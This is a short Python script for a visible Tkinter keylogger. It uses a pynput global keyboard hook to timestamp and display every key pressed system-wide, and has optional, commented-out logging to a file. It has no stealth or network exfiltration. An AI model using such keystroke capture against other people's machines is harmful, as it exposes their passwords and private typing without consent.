from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext
import time
import threading

# Global variable to control logging
logging = False

def on_key_press(key):
    global logging
    if logging:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_text = f"{timestamp} - {key}\n"
        text_area.insert(tk.END, log_text)

        # Append to file (optional)
        # with open("keylog.txt", "a") as log_file:
        #     log_file.write(log_text)

def start_logging():
    global logging
    logging = True
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

def stop_logging():
    global logging
    logging = False

def start_button_clicked():
    start_button.config(state=tk.DISABLED)  # Disable start button
    stop_button.config(state=tk.NORMAL)     # Enable stop button
    threading.Thread(target=start_logging).start()

def stop_button_clicked():
    global logging
    logging = False
    start_button.config(state=tk.NORMAL)    # Enable start button
    stop_button.config(state=tk.DISABLED)   # Disable stop button

# GUI setup
root = tk.Tk()
root.title("Keylogger")
root.geometry("600x400")
root.configure(bg='black')  # Set background color to black

# Create a scrolled text area for displaying logs
text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Arial", 12), bg='black', fg='white')
text_area.pack(fill=tk.BOTH, expand=True)

# Create a start button
start_button = tk.Button(root, text="Start Logging", font=("Arial", 14), command=start_button_clicked)
start_button.pack(pady=10)

# Create a stop button
stop_button = tk.Button(root, text="Stop Logging", font=("Arial", 14), command=stop_button_clicked, state=tk.DISABLED)
stop_button.pack(pady=10)

# Start the GUI main loop
root.mainloop()